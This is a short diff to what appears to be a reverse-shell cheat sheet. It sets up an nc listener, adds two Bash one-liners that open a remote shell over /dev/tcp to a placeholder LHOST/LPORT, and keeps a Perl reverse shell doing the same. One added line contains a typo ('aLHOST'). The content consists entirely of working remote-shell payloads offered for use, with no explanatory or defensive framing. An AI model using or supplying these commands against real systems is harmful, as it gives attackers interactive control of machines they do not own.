@@ -1,6 +1,14 @@
 # Setup Listener
 $ nc -l -v LHOST LPORT
 
+Bash
+0<&196;exec 196<>/dev/tcp/aLHOST/LPORT; sh <&196 >&196 2>&196
+
+Bash
+exec 5<>/dev/tcp/LHOST/LPORT
+cat <&5 | while read line; do $line 2>&5 >&5; done  # or:
+while read line 0<&5; do $line 2>&5 >&5; done
+
 Perl (does not depend on /bin/sh)
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 
